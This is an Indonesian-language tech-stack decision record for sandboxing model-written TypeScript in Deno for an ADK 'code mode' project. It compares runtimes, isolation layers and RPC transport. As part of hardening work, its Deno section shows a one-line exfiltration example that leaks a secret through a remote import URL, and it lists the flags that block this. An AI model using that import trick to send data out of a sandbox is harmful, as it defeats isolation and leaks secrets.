# Tech Stack — keputusan & alasan

Status: **dikunci** untuk v0. Tanggal: 2026-11-21.

Dokumen ini mencatat *kenapa*, bukan hanya *apa*. Setiap kandidat yang ditolak
ditulis dengan alasannya supaya tidak dibahas ulang dari nol.

---

## Ringkasan

| Lapisan | Pilihan | Alternatif utama yang ditolak |
|---|---|---|
| Host | **Python 3.12** | — (ADK Python, tidak ada pilihan) |
| Bahasa sandbox | **TypeScript** | Python (jadi lengan pembanding Fase 4), Rust (ditolak) |
| Runtime sandbox L1 | **Deno** | Node + tsx + isolated-vm, Bun, workerd, subprocess Python, wasmtime/WASI |
| Isolasi L2 (Fase 5) | **Docker** / LLM Sandbox | microsandbox, E2B self-hosted, gVisor, Firecracker |
| Transport RPC | **stdio** | HTTP localhost, named pipe, unix socket, vsock |
| Flag isolasi | `--no-remote --no-npm --deny-*` | `--deny-import` (tidak bekerja), `--cached-only` (lebih buruk) |
| Framing | **JSON Lines bertipe** | MessagePack, JSON-RPC 2.0 penuh, protobuf |
| Codegen | **manual, pluggable** | `json-schema-to-typescript`, datamodel-code-generator |
| Package manager | **uv** | pip, poetry, pdm |
| Test | **pytest + pytest-asyncio** | unittest |
| Lint/format | **ruff** | black + flake8 + isort |
| Validasi envelope | **pydantic** | dataclasses, manual |
| Eval harness | **pytest + pencatat metrik sendiri** | promptfoo, deepeval |

---

## 1. Bahasa sandbox: TypeScript

### Keputusan

TypeScript untuk v0. Python sebagai lengan pembanding di Fase 4.

### Kenapa

Arahan proyek adalah **setia pada blog Cloudflare**, dan yang sedang diuji
adalah klaim blog itu sendiri. Mengganti bahasanya memasukkan variabel
pengganggu: hasil buruk tidak bisa dibedakan antara "pola ini tidak cocok untuk
ADK" atau "Python-nya yang lemah untuk pola ini".

### Yang penting dicatat: ini hipotesis, bukan fakta

Klaim Cloudflare diawali kata *"perhaps"*:

> "Perhaps this is because LLMs have an enormous amount of real-world TypeScript
> in their training set, but only a small set of contrived examples of tool
> calls."

**Tidak ada implementasi code mode mana pun yang menerbitkan perbandingan TS vs
Python.** Argumen aslinya adalah *kode vs tool call*, bukan *TS vs Python*.

Pola pilihan bahasa di implementasi yang ada tampak mengikuti ekosistem host,
bukan keunggulan bahasa:

| Implementasi | Bahasa sandbox | Ekosistem host |
|---|---|---|
| Cloudflare Code Mode | TypeScript | JS (Workers) |
| Anthropic (blog riset) | TypeScript | — |
| Claude Code Code Mode | JavaScript | JS |
| Codex `exec` | JavaScript | Rust/JS |
| OpenCode `execute` | JavaScript | JS |
| pi `codemode` | JavaScript | JS |
| **Anthropic PTC (produk)** | **Python** | — |
| adk-code-mode | **Python** | Python |
| pydantic-ai CodeMode (Monty) | **Python** | Python |

Anthropic memakai TS di blog riset tapi **Python di produk resminya**
(Programmatic Tool Calling: "tools ... are exposed to Claude's code as async
Python functions").

Karena itu: `Codegen` dibuat pluggable, dan bahasa diperlakukan sebagai variabel
yang diukur di Fase 4. Biaya lengan kedua ~1,4x, bukan 2x, karena
`Catalog`/`RpcBridge`/`OutputGuard`/harness dipakai bersama.

### Yang benar-benar berbeda secara mekanis

| | TypeScript | Python |
|---|---|---|
| Konkurensi | `await` / `Promise.all` top-level, native | perlu harness `asyncio`, **atau** RPC sinkron (lihat catatan) |
| Hasil MCP (JSON) | objek native | `json.loads` atas text content |
| Info tipe untuk model | `interface` + doc comment | docstring + JSON Schema |
| Debug lintas bahasa | ya | tidak |

Sisanya (filter, loop, error handling) imbang.

**Catatan untuk lengan Python:** kalau RPC dibuat **sinkron memblokir**, sandbox
tidak butuh `asyncio` sama sekali dan masalah top-level `await` hilang. Harganya
hilangnya tool call paralel. Mitigasi: API batch eksplisit yang dijalankan
paralel di host.

### Kandidat yang ditolak

**Rust sebagai bahasa yang ditulis model.** Kompilasi butuh detik, bukan
milidetik — ekonomi code mode runtuh untuk kode sekali pakai. Borrow checker
adalah kelas error yang paling sulit diperbaiki LLM tanpa REPL. Cargo butuh
resolusi dependensi lewat jaringan, yang persisnya kita matikan. Volume training
data Rust jauh di bawah Python/TS, jadi argumen inti blog berbalik melawan.

Rust unggul untuk program yang dijalankan ribuan kali. Kode code mode dijalankan
**sekali** lalu dibuang.

Rust tetap dipakai secara tidak langsung: Deno, wasmtime, libkrun, Firecracker,
dan Monty semuanya ditulis dengan Rust. Dikonsumsi lewat binding, tidak ditulis
sendiri.

---

## 2. Runtime sandbox L1: Deno

### Keputusan

Deno, dengan `--deny-net --deny-env --deny-ffi --deny-run` dan hanya akses baca
ke direktori preamble.

### Kenapa

- **TS native** — tidak ada transpiler, tidak ada drama sourcemap. Ini penting:
  kalau model menulis TS tapi yang gagal adalah JS hasil transpile, nomor baris
  pada error tidak cocok dan model akan "memperbaiki" hal yang salah.
- **Permission deklaratif** — satu flag, bukan monkeypatch.
- **Satu biner**, jalan native di Windows.

### Temuan Fase 2: `--deny-net` TIDAK cukup

Module loader Deno adalah **subsistem terpisah** dengan allow-list **bawaan**:

```
deno.land:443 · jsr.io:443 · esm.sh:443 · raw.esm.sh:443
cdn.jsdelivr.net:443 · raw.githubusercontent.com:443
gist.githubusercontent.com:443
```

Dengan `--deny-net` saja, ini **berhasil**:

```ts
await import("https://esm.sh/lodash");   // BERHASIL
import x from "npm:lodash";               // mengunduh dari registry.npmjs.org
```

Itu kanal eksfiltrasi: URL-nya sendiri sudah membocorkan data
(`import("https://esm.sh/x?d=" + rahasia)`), sekaligus jalan masuk kode arbitrer.

Yang **tidak** memperbaikinya:
- `--deny-import` — tidak menimpa allow-list bawaan. Bahkan
  `--deny-import=esm.sh` tetap meloloskan.
- `--cached-only` — **lebih buruk**: modul yang sudah ter-cache tetap lolos,
  jadi hasilnya bergantung pada isi cache.

Yang benar: **`--no-remote` + `--no-npm`**. Keduanya memblokir `https:`, `jsr:`,
dan `npm:`, dan tidak mengganggu `data:` URL yang dipakai memuat kode model.

Ada test regresi berparameter untuk kelima specifier di
`tests/test_sandbox.py::test_import_remote_ditolak`.

### Batas yang harus jujur

> Permission berbasis flag **bukan** batas keamanan. Deno/V8 pernah punya CVE.
> Batas keamanan nyata = container atau VM.

Lapisan L1 ini mencegah **kecelakaan**, bukan **penyerang**. Untuk tes lokal di
mesin sendiri itu memadai. Begitu dipakai orang lain, L2 wajib (Fase 5).

### Kandidat yang ditolak

**workerd / Worker Loader.** Pilihan paling setia blog, tapi:

- `wrangler dev` menjalankan workerd lokal yang **"is not a hardened sandbox.
  Only run code you trust."** — dokumen Cloudflare sendiri.
- Kenton Varda di PR aslinya: *"This is strictly an implementation in workerd —
  the production runtime would need a very different implementation."*
- **Tidak ada build step:** *"languages like TypeScript must be compiled to
  JavaScript before being passed to `load()`"* → butuh esbuild/swc + sourcemap.
- Konfigurasi capnp.

Kesimpulan: isolasi kuat Code Mode adalah properti **infra Cloudflare**, bukan
properti workerd yang di-self-host. Kalau target deploy bukan Cloudflare,
workerd hanya menambah runtime kedua tanpa memberi jaminan keamanannya.

**Node + tsx/esbuild + isolated-vm.** Lebih banyak bagian bergerak, perlu
transpile, model permission tidak setara.

**Bun.** Tidak punya model permission setara Deno.

**subprocess Python `-I -S` + builtins dipangkas.** Isolasi jauh lebih lemah
(trivial ditembus), dan bukan TS. Tetap jadi fallback kalau S4 gagal.

**wasmtime + CPython WASI.** Kandidat teknis terkuat untuk lengan **Python**, dan
analog terdekat dengan isolate V8 Cloudflare yang bisa di-self-host:

- **16 ms** start dengan modul precompiled ke `.cwasm` (ukuran Pydantic, M3 Max)
- `socket.socket()` dan `subprocess.run()` **raise `OSError`**;
  `threading.Thread.start()` raise `RuntimeError`; `ctypes` tidak import →
  jaringan dan spawn proses **mustahil secara struktural**, bukan diblokir
  kebijakan
- Capability model: guest hanya melihat direktori yang di-preopen
- In-process lewat embedding `wasmtime`, tanpa subprocess

Objeksi standar ("ekosistem Python tidak ramah WASM, paket data science tidak
punya build WASI") **tidak berlaku di sini** — kode code mode hanya butuh stdlib
(`json`, `re`, `itertools`, `statistics`, `datetime`) untuk memfilter hasil JSON.

Tidak dipakai di v0 hanya karena bahasanya Python. Masuk Fase 4.

Biaya: distribusi CPython WASI ~13 MB unduh / ~54 MB terbuka.

---

## 3. Isolasi L2 (Fase 5)

Rancangan berlapis. Jangan namai L1 "sandbox keamanan".

| Lapisan | Fungsi | Isi |
|---|---|---|
| L1 proses | Batasi kapabilitas, cegah kecelakaan | Deno `--deny-*` |
| L2 OS | Batas keamanan sesungguhnya | Docker `--network none --read-only --cap-drop ALL`, non-root, limit memory/pids |
| L3 kernel | Multi-tenant | gVisor / microVM — hanya kalau dipakai orang lain |

### Kandidat L2/L3

**LLM Sandbox** (MIT) — library Python dengan backend Docker/Podman/K8s/
Bubblewrap/NsJail. Bahasa host sama, abstraksi backend rapi. Kandidat utama.

**microsandbox** (Apache-2.0) — microVM libkrun, embeddable sebagai library tanpa
daemon, OCI image, klaim boot <100 ms, jalan di Windows (butuh WHP). Menarik,
tapi tiga catatan:

1. **Loopback dan private range diblokir secara default** → callback RPC lewat
   jaringan mati. Harus lewat exec + stdio; perlu diverifikasi.
2. Status **beta**: *"Expect breaking changes, missing features, and rough
   edges."* (v0.7.8)
3. microVM bukan sihir. Dari dokumen keamanan libkrun: *"the guest and the VMM
   pertain to the same security context... To prevent the guest from accessing
   host's resources, you need to use the host's OS security features to run the
   VMM inside an isolated context."* VMM-nya sendiri masih harus dikurung.

**E2B self-hosted (Embed)** (Apache-2.0) — Firecracker per sandbox. Butuh host
Linux + KVM, Docker Compose/Terraform/K8s. Internet **ON** default. Terlalu berat
untuk tes lokal di Windows.

**Daytona** — **mati.** Repo diarsipkan Okt 2026, pengembangan pindah closed
source Juni 2026. Kode terakhir AGPL-3.0 v0.190.0 tanpa dukungan. Tidak layak
untuk komponen yang tugasnya mengurung kode bermusuhan.

**Sandbox cloud** (E2B/Modal/Daytona cloud) — **tidak cocok secara arsitektur.**
Code Mode butuh RPC dua arah: sandbox harus menelepon balik host untuk setiap
tool call. Sandbox di cloud + host di laptop = butuh tunnel, dan itu membalik
model keamanan. Terukur ~1,5 s create, ~40 ms per call.

---

## 4. Transport & framing

### Keputusan

stdio (stdin/stdout pipe ke subprocess), JSON Lines, satu objek per baris,
pesan **bertipe**: `call` · `result` · `log` · `done` · `error`.

### Kenapa stdio, bukan HTTP localhost

Ini alasan teknis, bukan selera: **kalau RPC lewat stdio, sandbox tidak butuh
jaringan sama sekali**, jadi `--deny-net` benar-benar total. Kalau RPC lewat HTTP
ke localhost, kamu harus membuka lubang jaringan dan itu melemahkan seluruh
argumennya.

Ini juga sejalan dengan semangat bindings Cloudflare — kapabilitas, bukan
jaringan:

> "Limiting access via bindings is much cleaner than doing it via network-level
> filtering or HTTP proxies... the binding provides a JavaScript interface, and
> that interface is allowed to be used."

### Kendala Windows

`fd 3` tidak bisa diandalkan dan named pipe menambah kerumitan lintas platform →
hanya stdin/stdout.

### Masalah pencampuran channel

`console.log` default menulis ke stdout, yang juga jadi channel RPC. Jangan
andalkan stderr — model bisa menulis ke mana saja.

**Solusi:** override `console.log` di preamble sandbox supaya log dikirim sebagai
pesan RPC bertipe `log`. Satu stream, pesan bertipe. Ini juga membuat bounding
output gampang — host sudah melihat setiap pesan log satu per satu.

### Ditolak

MessagePack/protobuf — bottleneck-nya LLM, bukan serialisasi; JSON Lines jauh
lebih mudah di-debug. JSON-RPC 2.0 penuh — overhead tanpa manfaat untuk
transport titik-ke-titik.

---

## 5. Codegen

### Keputusan

Manual, pluggable per bahasa target. Subset JSON Schema dulu.

- Mulai dari: `object`, `string`, `number`, `boolean`, `array`, `enum`, optional
- `oneOf` / `anyOf` / `$ref` / nested `additionalProperties` → tipe longgar
  (`unknown`) + doc comment yang menjelaskan
- Nama tool **dipertahankan apa adanya** (blog memakai
  `fetch_agents_documentation`, bukan camelCase) — hindari lapisan pemetaan
- Namespace `tools.<server>.<tool>` (blog memakai `declare const codemode`
  flat; dengan >1 server akan tabrakan)

### Prinsip

**Doc comment lebih penting daripada ketepatan tipe.** Model membaca deskripsi,
bukan memverifikasi tipe. `description` dari MCP jangan dipotong — itu yang
menggantikan tool description.

### Ditolak

`json-schema-to-typescript` — menghasilkan tipe untuk schema aneh yang justru
membingungkan model. Subset manual lebih terkontrol.

---

## 6. Tooling Python

- **uv 0.11.9** (sudah terpasang) — project + venv + lock
- **pytest + pytest-asyncio** — semua jalur kode async
- **ruff** — lint + format, satu alat
- **pydantic** — sudah transitive dari ADK. Dipakai untuk validasi envelope RPC.
  Validasi batas dari sandbox itu **wajib**, bukan opsional.

### Eval harness (Fase 4): ditulis sendiri

Bukan promptfoo/deepeval. Alasannya: butuh akses ke `usage_metadata` event ADK
dan hitungan call di `RpcBridge` — lebih mudah ditulis sendiri daripada
dipaksakan ke framework eval.

Harness juga butuh **mock MCP server berparameter** (jumlah tool 10/30/60 ×
kompleksitas schema flat/nested/`oneOf`). Alasannya:
`@modelcontextprotocol/server-filesystem` hanya ~11 tool dengan schema satu-dua
field, jadi **tidak bisa** menguji dua dari tiga klaim blog ("many more tools",
"more complex tools"). Detail di `implementasi.md` Fase 4.

---

## 7. Environment terverifikasi

| | Versi | Catatan |
|---|---|---|
| OS | Windows | WSL tersedia; Docker Desktop pakai backend WSL2 (start 1-2 s) |
| Python | 3.12 | `pip 24.3.1` |
| google-adk | **1.33.0** | `McpTool._mcp_tool` privat → risiko S3 |
| mcp | 1.26.0 | |
| uv | 0.11.9 | |
| Node | v22.15.0 | untuk `npx @modelcontextprotocol/server-filesystem` |
| Docker | 28.5.2 | untuk L2 di Fase 5 |
| Deno | **belum terpasang** | dipasang di Fase 0 / S4 |

---

## 8. Kapan dokumen ini ditinjau ulang

- Setelah **Fase 0** — kalau S4 (Deno di Windows) gagal
- Setelah **Fase 4** — hasil TS vs Python bisa membalik §1
- Sebelum **Fase 5** — pilihan L2 final, setelah tahu siapa penggunanya
